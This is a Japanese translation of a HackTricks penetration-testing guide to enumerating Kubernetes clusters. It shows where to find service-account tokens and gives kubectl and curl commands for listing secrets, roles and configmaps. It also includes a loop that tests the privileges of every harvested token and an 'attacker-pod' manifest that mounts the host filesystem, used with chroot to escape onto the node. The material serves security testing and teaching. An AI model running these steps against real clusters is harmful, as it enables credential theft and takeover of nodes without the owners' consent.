# Kubernetes列挙

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricksであなたの会社を宣伝したい**場合や、**最新バージョンのPEASSやHackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有しましょう。

</details>

## Kubernetesトークン

もしマシンへのアクセスが侵害されている場合、ユーザーはいくつかのKubernetesプラットフォームにアクセスできるかもしれません。トークンは通常、**環境変数`KUBECONFIG`**が指すファイルまたは**`~/.kube`**内にあります。

このフォルダには、**APIサーバーに接続するためのトークンと設定が含まれる構成ファイル**が含まれています。また、このフォルダには以前に取得した情報が格納されているキャッシュフォルダもあります。

もしKubernetes環境内のポッドが侵害されている場合、現在のK8環境に関するトークンや情報を見つけることができる他の場所もあります。

### サービスアカウントトークン

続行する前に、Kubernetesのサービスとは何かを知らない場合は、**このリンクに従ってKubernetesのアーキテクチャに関する情報を少なくとも読んでください**。

Kubernetesの[ドキュメント](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)から引用：

_「ポッドを作成するとき、サービスアカウントを指定しない場合、同じ名前空間の_デフォルト_サービスアカウントが自動的に割り当てられます。」_

**ServiceAccount**は、Kubernetesによって管理され、ポッドで実行されるプロセスに対してアイデンティティを提供するために使用されるオブジェクトです。\
すべてのサービスアカウントにはそれに関連するシークレットがあり、このシークレットにはベアラートークンが含まれています。これはJSON Web Token（JWT）であり、2つのパーティ間で安全にクレームを表現するための方法です。

通常、次のいずれかのディレクトリ：

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

には次のファイルが含まれています：

* **ca.crt**：Kubernetes通信を確認するためのCA証明書です。
* **namespace**：現在の名前空間を示します。
* **token**：現在のポッドの**サービストークン**が含まれています。

トークンを取得したら、APIサーバーは環境変数**`KUBECONFIG`**内にあります。詳細については、`(env | set) | grep -i "kuber|kube`**`"`**を実行してください。

サービスアカウントトークンは、**sa.key**ファイルに存在するキーによって署名され、**sa.pub**によって検証されます。

**Kubernetes**のデフォルトの場所：

* /etc/kubernetes/pki

**Minikube**のデフォルトの場所：

* /var/lib/localkube/certs

### ホットポッド

_**ホットポッド**_は、特権サービスアカウントトークンを含むポッドです。特権サービスアカウントトークンは、シークレットのリスト表示、ポッドの作成などの特権タスクを実行する権限を持つトークンです。

## RBAC

**RBAC**が何かわからない場合は、**このセクション**を読んでください。

## 列挙チートシート

K8s環境を列挙するためには、次のものが必要です：

* **有効な認証トークン**。前のセクションでユーザートークンとサービスアカウントトークンを検索する場所を見ました。
* Kubernetes APIの**アドレス（_**https://host:port**_**）**。これは通常、環境変数と/またはkube構成ファイルに見つかります。
* **オプション**：APIサーバーを検証するための**ca.crt**。これはトークンが見つかる場所と同じ場所にあります。これはAPIサーバー証明書を検証するために役立ちますが、`kubectl`で`--insecure-skip-tls-verify`を使用するか、`curl`で`-k`を使用すると、これは必要ありません。

これらの詳細を使用して、Kubernetesを列挙できます。APIが何らかの理由でインターネット経由でアクセス可能な場合、ホストからその情報をダウンロードしてプラットフォームを列挙することができます。

ただし、通常はAPIサーバーが内部ネットワークにあるため、侵害されたマシンを介してアクセスするためにトンネルを作成するか、[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)バイナリをアップロードするか、`curl/wget/anything`を使用してAPIサーバーに対して生のHTTPリクエストを実行する必要があります。

### `list`と`get`の動詞の違い

**`get`**権限を持つ場合、特定のアセットの情報（`kubectl`の`describe`オプション）にアクセスできます。API：
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
もし**`list`**権限を持っている場合、特定の資産の一覧を取得するためのAPIリクエストを実行することが許可されます（`kubectl`の`get`オプション）。
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
もし**`watch`**権限を持っている場合、アセットを監視するためにAPIリクエストを実行することが許可されます。
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
彼らは、Deploymentが変更されるたびに（または新しいものが作成されるときに）、フルマニフェストを返すストリーミング接続を開きます。

{% hint style="danger" %}
次の`kubectl`コマンドは、オブジェクトをリストする方法を示しています。データにアクセスする場合は、`get`の代わりに`describe`を使用する必要があります。
{% endhint %}

### curlを使用する

ポッド内からは、いくつかの環境変数を使用できます：
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
デフォルトでは、ポッドはドメイン名`kubernetes.default.svc`で**kube-apiサーバー**に**アクセス**できます。また、`/etc/resolv.config`にはkubernetes DNSサーバーのアドレスが記載されています（同じ範囲の".1"がkube-apiエンドポイントです）。
{% endhint %}

### kubectlを使用する

トークンとAPIサーバーのアドレスを持っている場合、以下のようにkubectlまたはcurlを使用してアクセスできます。

デフォルトでは、APISERVERは`https://`スキーマで通信しています。
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> もしURLに`https://`がない場合、Bad Requestのようなエラーが発生する可能性があります。

[**公式のkubectlチートシートはこちら**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)で見つけることができます。以下のセクションでは、取得した新しいK8sの列挙と理解のためのさまざまなオプションを順序立てて紹介します。

`kubectl`が送信するHTTPリクエストを見つけるには、パラメータ`-v=8`を使用できます。

#### MitM kubectl - kubectlのプロキシ化
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### 現在の設定

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

ユーザーの資格情報を盗むことができた場合、次のようにしてそれらを**ローカルで設定**することができます。
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### サポートされているリソースの取得

この情報を使用すると、リストできるすべてのサービスを把握することができます。

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### 現在の特権を取得する

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

特権を確認する別の方法は、ツールを使用することです: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

**Kubernetes RBAC**について詳しくは、次のページを参照してください:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**どの特権を持っているか**を知ったら、以下のページをチェックして、特権をエスカレーションするためにそれらを悪用できるかどうかを確認してください:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 他のロールを取得する

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### 名前空間の取得

Kubernetesは、同じ物理クラスタをバックエンドとする**複数の仮想クラスタ**をサポートしています。これらの仮想クラスタは**名前空間**と呼ばれます。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### シークレットの取得

{% tabs %}
{% tab title="kubectl" %}以下のコマンドを使用して、シークレットを取得できます。

```bash
kubectl get secrets
```

シークレットの一覧が表示されます。{% endtab %}
{% endtabs %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

シークレットを読むことができる場合、以下の行を使用して、各トークンに関連する特権を取得できます。
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### サービスアカウントの取得

このページの冒頭で説明したように、**ポッドが実行されると通常はサービスアカウントが割り当てられます**。したがって、サービスアカウントの一覧表示、その権限、および実行場所を確認することで、ユーザーは特権を昇格させることができるかもしれません。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### デプロイメントの取得

デプロイメントは、実行する必要がある**コンポーネント**を指定します。
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### ポッドの取得

ポッドは実際に実行される**コンテナ**です。

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### サービスの取得

Kubernetesの**サービス**は、**特定のポートとIPでサービスを公開するために使用**されます（実際にサービスを提供しているポッドへの負荷分散装置として機能します）。これは、攻撃を試みる他のサービスを見つけることができる場所を知るために興味深いです。

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### ノードの取得

クラスタ内に構成されているすべてのノードを取得します。

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### デーモンセットの取得

**デーモンセット**は、クラスターのすべてのノード（または選択されたノード）で特定のポッドが実行されることを保証することができます。デーモンセットを削除すると、それによって管理されるポッドも削除されます。

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### cronjobの取得

Cronジョブは、crontabのような構文を使用して、特定のアクションを実行するポッドの起動をスケジュールすることができます。

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### configMapの取得

configMapには常に、Kubernetesで実行されるアプリケーションに提供される多くの情報と設定ファイルが含まれています。通常、内部/外部のサービスに接続し、検証するために使用されるパスワード、シークレット、トークンなどが多く含まれています。

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### "all"を取得する

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Podの消費量を取得する**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### ポッドからの脱出

新しいポッドを作成できる場合、それらからノードに脱出することができるかもしれません。そのためには、yamlファイルを使用して新しいポッドを作成し、作成されたポッドに切り替えてからノードのシステムにchrootする必要があります。既存のポッドを参照してyamlファイルを作成することができます。既存のポッドは既存のイメージとパスを表示しています。
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> 特定のノード上にポッドを作成する必要がある場合は、次のコマンドを使用してノードのラベルを取得できます。
>
> `k get nodes --show-labels`
>
> 一般的に、kubernetes.io/hostnameとnode-role.kubernetes.io/masterは、選択するための良いラベルです。
>
> [参照]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
>
> 次に、attack.yamlファイルを作成します。
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[元のyamlソース](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

その後、ポッドを作成します。
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
以下のように作成したポッドに切り替えることができます。

```bash
kubectl exec -it <pod-name> -- /bin/bash
```

または

```bash
kubectl exec -it <pod-name> -- /bin/sh
```

これにより、ポッド内で対話型シェルセッションを開始できます。
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- bash # attacker-pod is the name defined in the yaml file
```
そして最後に、ノードのシステムにchrootします。
```bash
chroot /root /bin/bash
```
情報の取得元：[Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## 参考文献

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricks で会社を宣伝したい**場合や、**PEASS の最新バージョンにアクセスしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式の PEASS & HackTricks のグッズ**](https://peass.creator-spring.com) を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を見つけて、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを発見しましょう
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローしましょう
* **ハッキングのトリックを共有するために、PR を** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **の GitHub リポジトリに提出しましょう**

</details>
